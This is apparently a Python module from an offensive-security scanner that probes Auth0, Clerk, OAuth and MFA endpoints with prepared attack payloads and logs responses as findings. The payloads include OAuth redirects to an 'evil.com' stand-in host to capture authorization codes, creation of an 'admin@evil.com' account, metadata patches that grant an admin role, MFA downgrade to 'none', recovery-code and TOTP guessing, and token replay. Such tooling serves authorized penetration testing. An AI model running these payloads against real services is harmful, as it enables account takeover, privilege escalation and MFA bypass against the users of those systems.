"""Auth Services Deep Testing — deep testing of Auth0, Clerk, Firebase Auth, and generic OAuth.

This module tests:
1. Auth0: Tenant enumeration, OIDC discovery, management API, attack surface
2. Clerk: Session hijacking, JWT manipulation, webhook abuse
3. Generic OAuth: Redirect URI manipulation, state parameter, token exchange
4. Session management: Fixation, rotation, invalidation
5. Token abuse: Replay, confusion, injection
6. MFA bypass: Downgrade, recovery code abuse
"""

from __future__ import annotations

import json
import re
import base64
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

from titan.core.models import Finding, Severity, AttackType


@dataclass
class AuthPayload:
    """An auth services test payload."""
    name: str
    category: str
    endpoint: str
    method: str
    payload: Any
    expected_effect: str
    severity: Severity
    confidence: float
    headers: Optional[Dict[str, str]] = None


class AuthServicesTester:
    """Deep Auth Services testing."""

    # ── Auth0 Testing Payloads ──────────────────────────────────────────

    AUTH0_PAYLOADS = [
        # OIDC Discovery
        AuthPayload(
            name="oidc_discovery",
            category="auth0_enum",
            endpoint="/.well-known/openid-configuration",
            method="GET",
            payload=None,
            expected_effect="oidc_config",
            severity=Severity.HIGH,
            confidence=0.90,
        ),
        AuthPayload(
            name="jwks_endpoint",
            category="auth0_enum",
            endpoint="/.well-known/jwks.json",
            method="GET",
            payload=None,
            expected_effect="jwks_leak",
            severity=Severity.HIGH,
            confidence=0.85,
        ),
        AuthPayload(
            name="tenant_info",
            category="auth0_enum",
            endpoint="/api/v2/tenants/settings",
            method="GET",
            payload=None,
            expected_effect="tenant_leak",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        # Management API
        AuthPayload(
            name="management_api_users",
            category="auth0_management",
            endpoint="/api/v2/users",
            method="GET",
            payload=None,
            expected_effect="user_list",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        AuthPayload(
            name="management_api_roles",
            category="auth0_management",
            endpoint="/api/v2/roles",
            method="GET",
            payload=None,
            expected_effect="role_list",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        AuthPayload(
            name="management_api_connections",
            category="auth0_management",
            endpoint="/api/v2/connections",
            method="GET",
            payload=None,
            expected_effect="connection_list",
            severity=Severity.HIGH,
            confidence=0.85,
        ),
        # Token Abuse
        AuthPayload(
            name="token_exchange",
            category="auth0_token",
            endpoint="/oauth/token",
            method="POST",
            payload={
                "grant_type": "password",
                "client_id": "test",
                "username": "test@test.com",
                "password": "test123",
                "scope": "openid",
            },
            expected_effect="token_exchange",
            severity=Severity.HIGH,
            confidence=0.70,
        ),
        AuthPayload(
            name="client_credentials",
            category="auth0_token",
            endpoint="/oauth/token",
            method="POST",
            payload={
                "grant_type": "client_credentials",
                "client_id": "test",
                "client_secret": "test",
                "audience": "https://api.example.com",
            },
            expected_effect="client_credentials_abuse",
            severity=Severity.HIGH,
            confidence=0.65,
        ),
        # Attack Surface
        AuthPayload(
            name="authorize_endpoint",
            category="auth0_attack",
            endpoint="/authorize",
            method="GET",
            payload={
                "response_type": "code",
                "client_id": "test",
                "redirect_uri": "http://evil.com",
                "scope": "openid profile email",
            },
            expected_effect="redirect_abuse",
            severity=Severity.HIGH,
            confidence=0.70,
        ),
        AuthPayload(
            name="logout_endpoint",
            category="auth0_attack",
            endpoint="/v2/logout",
            method="GET",
            payload={
                "client_id": "test",
                "returnTo": "http://evil.com",
            },
            expected_effect="logout_redirect",
            severity=Severity.MEDIUM,
            confidence=0.65,
        ),
    ]

    # ── Clerk Testing Payloads ──────────────────────────────────────────

    CLERK_PAYLOADS = [
        # Session Abuse
        AuthPayload(
            name="session_list",
            category="clerk_session",
            endpoint="/v1/sessions",
            method="GET",
            payload=None,
            expected_effect="session_list",
            severity=Severity.HIGH,
            confidence=0.85,
        ),
        AuthPayload(
            name="session_jwks",
            category="clerk_session",
            endpoint="/.well-known/jwks.json",
            method="GET",
            payload=None,
            expected_effect="jwks_leak",
            severity=Severity.HIGH,
            confidence=0.85,
        ),
        AuthPayload(
            name="session_verify",
            category="clerk_session",
            endpoint="/v1/sessions/{session_id}/verify",
            method="POST",
            payload={"token": "test"},
            expected_effect="session_verify",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        # User Abuse
        AuthPayload(
            name="user_list",
            category="clerk_user",
            endpoint="/v1/users",
            method="GET",
            payload=None,
            expected_effect="user_list",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        AuthPayload(
            name="user_create",
            category="clerk_user",
            endpoint="/v1/users",
            method="POST",
            payload={"email_address": ["admin@evil.com"], "password": "hacked123"},
            expected_effect="user_creation",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        AuthPayload(
            name="user_metadata_update",
            category="clerk_user",
            endpoint="/v1/users/{user_id}",
            method="PATCH",
            payload={"public_metadata": {"role": "admin"}},
            expected_effect="metadata_escalation",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
        AuthPayload(
            name="user_private_metadata",
            category="clerk_user",
            endpoint="/v1/users/{user_id}",
            method="PATCH",
            payload={"private_metadata": {"role": "admin", "is_admin": True}},
            expected_effect="private_metadata_escalation",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
        # Webhook Abuse
        AuthPayload(
            name="webhook_test",
            category="clerk_webhook",
            endpoint="/v1/webhooks",
            method="GET",
            payload=None,
            expected_effect="webhook_list",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        # Organization Abuse
        AuthPayload(
            name="org_list",
            category="clerk_org",
            endpoint="/v1/organizations",
            method="GET",
            payload=None,
            expected_effect="org_list",
            severity=Severity.HIGH,
            confidence=0.85,
        ),
        AuthPayload(
            name="org_create",
            category="clerk_org",
            endpoint="/v1/organizations",
            method="POST",
            payload={"name": "evil-org", "slug": "evil-org"},
            expected_effect="org_creation",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
    ]

    # ── OAuth Abuse Payloads ────────────────────────────────────────────

    OAUTH_ABUSE_PAYLOADS = [
        AuthPayload(
            name="redirect_uri_open",
            category="oauth_abuse",
            endpoint="/oauth/authorize",
            method="GET",
            payload={
                "response_type": "code",
                "client_id": "test",
                "redirect_uri": "http://evil.com/callback",
                "scope": "openid profile email",
            },
            expected_effect="open_redirect",
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        AuthPayload(
            name="redirect_uri_subdomain",
            category="oauth_abuse",
            endpoint="/oauth/authorize",
            method="GET",
            payload={
                "response_type": "code",
                "client_id": "test",
                "redirect_uri": "http://evil.target.com/callback",
                "scope": "openid",
            },
            expected_effect="subdomain_redirect",
            severity=Severity.HIGH,
            confidence=0.75,
        ),
        AuthPayload(
            name="redirect_uri_path_traversal",
            category="oauth_abuse",
            endpoint="/oauth/authorize",
            method="GET",
            payload={
                "response_type": "code",
                "client_id": "test",
                "redirect_uri": "http://target.com/../../../evil.com",
                "scope": "openid",
            },
            expected_effect="path_traversal_redirect",
            severity=Severity.HIGH,
            confidence=0.70,
        ),
        AuthPayload(
            name="state_parameter_missing",
            category="oauth_abuse",
            endpoint="/oauth/authorize",
            method="GET",
            payload={
                "response_type": "code",
                "client_id": "test",
                "redirect_uri": "http://target.com/callback",
            },
            expected_effect="csrf_no_state",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        AuthPayload(
            name="token_exchange_no_code",
            category="oauth_abuse",
            endpoint="/oauth/token",
            method="POST",
            payload={
                "grant_type": "authorization_code",
                "client_id": "test",
                "redirect_uri": "http://evil.com",
            },
            expected_effect="token_exchange_error",
            severity=Severity.MEDIUM,
            confidence=0.60,
        ),
        AuthPayload(
            name="token_replay",
            category="oauth_abuse",
            endpoint="/oauth/token",
            method="POST",
            payload={
                "grant_type": "authorization_code",
                "code": "replay_code",
                "client_id": "test",
                "redirect_uri": "http://target.com",
            },
            expected_effect="token_replay",
            severity=Severity.HIGH,
            confidence=0.70,
        ),
    ]

    # ── Session Management Payloads ─────────────────────────────────────

    SESSION_MANAGEMENT_PAYLOADS = [
        AuthPayload(
            name="session_fixation",
            category="session_mgmt",
            endpoint="/session/fix",
            method="GET",
            payload=None,
            expected_effect="session_fixation",
            severity=Severity.HIGH,
            confidence=0.70,
        ),
        AuthPayload(
            name="session_no_rotation",
            category="session_mgmt",
            endpoint="/session/refresh",
            method="POST",
            payload=None,
            expected_effect="no_rotation",
            severity=Severity.HIGH,
            confidence=0.75,
        ),
        AuthPayload(
            name="session_concurrent",
            category="session_mgmt",
            endpoint="/session/concurrent",
            method="POST",
            payload=None,
            expected_effect="concurrent_sessions",
            severity=Severity.MEDIUM,
            confidence=0.65,
        ),
    ]

    # ── MFA Bypass Payloads ─────────────────────────────────────────────

    MFA_BYPASS_PAYLOADS = [
        AuthPayload(
            name="mfa_downgrade",
            category="mfa_bypass",
            endpoint="/auth/mfa",
            method="POST",
            payload={"factor": "none"},
            expected_effect="mfa_skip",
            severity=Severity.CRITICAL,
            confidence=0.80,
        ),
        AuthPayload(
            name="mfa_recovery_code",
            category="mfa_bypass",
            endpoint="/auth/mfa/recovery",
            method="POST",
            payload={"code": "00000000"},
            expected_effect="recovery_abuse",
            severity=Severity.HIGH,
            confidence=0.70,
        ),
        AuthPayload(
            name="mfa_totp_brute",
            category="mfa_bypass",
            endpoint="/auth/mfa/totp",
            method="POST",
            payload={"code": "000000"},
            expected_effect="totp_brute",
            severity=Severity.HIGH,
            confidence=0.60,
        ),
    ]

    def __init__(self, context: Any = None):
        self.context = context
        self._findings: List[Finding] = []

    async def test_auth0(
        self,
        target_url: str,
        auth0_domain: str,
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """Test Auth0 configuration."""
        findings = []

        for payload in self.AUTH0_PAYLOADS:
            try:
                url = f"https://{auth0_domain}{payload.endpoint}"
                if payload.headers:
                    url = url.replace("{domain}", auth0_domain)

                response = await self._send_request(
                    url, payload.method, payload.payload, auth_headers
                )

                if response and self._check_auth_response(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=url,
                        method=payload.method,
                        param=payload.name,
                        location="auth0",
                        payload=json.dumps(payload.payload) if payload.payload else "",
                        attack_type=AttackType.INFO_LEAK if "enum" in payload.category else AttackType.BUSINESS_LOGIC,
                        severity=payload.severity,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        evidence=response.get("body", "")[:500],
                        tier="confirmed" if payload.confidence > 0.85 else "suspicious",
                        tags=["baas", "auth0", payload.category, payload.name],
                        notes=f"Auth0: {payload.name}",
                    )
                    findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    async def test_clerk(
        self,
        target_url: str,
        clerk_domain: str,
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """Test Clerk configuration."""
        findings = []

        for payload in self.CLERK_PAYLOADS:
            try:
                url = f"https://{clerk_domain}{payload.endpoint}"

                response = await self._send_request(
                    url, payload.method, payload.payload, auth_headers
                )

                if response and self._check_auth_response(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=url,
                        method=payload.method,
                        param=payload.name,
                        location="clerk",
                        payload=json.dumps(payload.payload) if payload.payload else "",
                        attack_type=AttackType.INFO_LEAK if "enum" in payload.category else AttackType.BUSINESS_LOGIC,
                        severity=payload.severity,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        evidence=response.get("body", "")[:500],
                        tier="confirmed" if payload.confidence > 0.85 else "suspicious",
                        tags=["baas", "clerk", payload.category, payload.name],
                        notes=f"Clerk: {payload.name}",
                    )
                    findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    async def test_oauth(
        self,
        target_url: str,
        auth_endpoint: str,
        token_endpoint: str,
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """Test OAuth flow abuse."""
        findings = []

        for payload in self.OAUTH_ABUSE_PAYLOADS:
            try:
                if "authorize" in payload.endpoint:
                    url = auth_endpoint
                elif "token" in payload.endpoint:
                    url = token_endpoint
                else:
                    url = f"{target_url}{payload.endpoint}"

                response = await self._send_request(
                    url, payload.method, payload.payload, auth_headers
                )

                if response and self._check_auth_response(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=url,
                        method=payload.method,
                        param=payload.name,
                        location="oauth",
                        payload=json.dumps(payload.payload) if payload.payload else "",
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=payload.severity,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        evidence=response.get("body", "")[:500],
                        tier="confirmed" if payload.confidence > 0.85 else "suspicious",
                        tags=["auth", "oauth", payload.name],
                        notes=f"OAuth abuse: {payload.name}",
                    )
                    findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    async def test_mfa_bypass(
        self,
        target_url: str,
        auth_endpoint: str,
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """Test MFA bypass."""
        findings = []

        for payload in self.MFA_BYPASS_PAYLOADS:
            try:
                url = f"{target_url}{payload.endpoint}"

                response = await self._send_request(
                    url, payload.method, payload.payload, auth_headers
                )

                if response and self._check_auth_response(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=url,
                        method=payload.method,
                        param=payload.name,
                        location="mfa",
                        payload=json.dumps(payload.payload) if payload.payload else "",
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=payload.severity,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        evidence=response.get("body", "")[:500],
                        tier="confirmed" if payload.confidence > 0.85 else "suspicious",
                        tags=["auth", "mfa", payload.name],
                        notes=f"MFA bypass: {payload.name}",
                    )
                    findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    # ── Helpers ────────────────────────────────────────────────────────

    async def _send_request(
        self,
        url: str,
        method: str,
        payload: Any,
        headers: Optional[Dict[str, str]] = None,
    ) -> Optional[Dict[str, Any]]:
        """Send HTTP request."""
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                req_headers = headers or {}
                req_headers.setdefault("Content-Type", "application/json")
                req_headers.setdefault("Accept", "application/json")

                if method.upper() == "GET":
                    async with session.get(url, headers=req_headers, params=payload) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
                elif method.upper() == "POST":
                    async with session.post(url, json=payload, headers=req_headers) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
        except Exception:
            return None

    def _check_auth_response(self, response: Dict[str, Any], payload: AuthPayload) -> bool:
        """Check if auth endpoint responded with useful data."""
        status = response.get("status", 0)
        body = response.get("body", "")

        if status == 200:
            if body and body not in ("null", ""):
                # Check for meaningful data
                if any(kw in body.lower() for kw in [
                    "email", "user", "session", "token", "role", "admin",
                    "oidc", "jwks", "issuer", "authorization_endpoint",
                    "refresh_token", "access_token", "id_token",
                ]):
                    return True
                # Check for JSON with data
                try:
                    data = json.loads(body)
                    if isinstance(data, (dict, list)) and len(str(data)) > 50:
                        return True
                except json.JSONDecodeError:
                    pass

        elif status == 401:
            # Check for useful error info
            if any(kw in body.lower() for kw in ["invalid_client", "invalid_grant", "unauthorized"]):
                return True

        return False

    def get_findings(self) -> List[Finding]:
        """Get all findings."""
        return self._findings
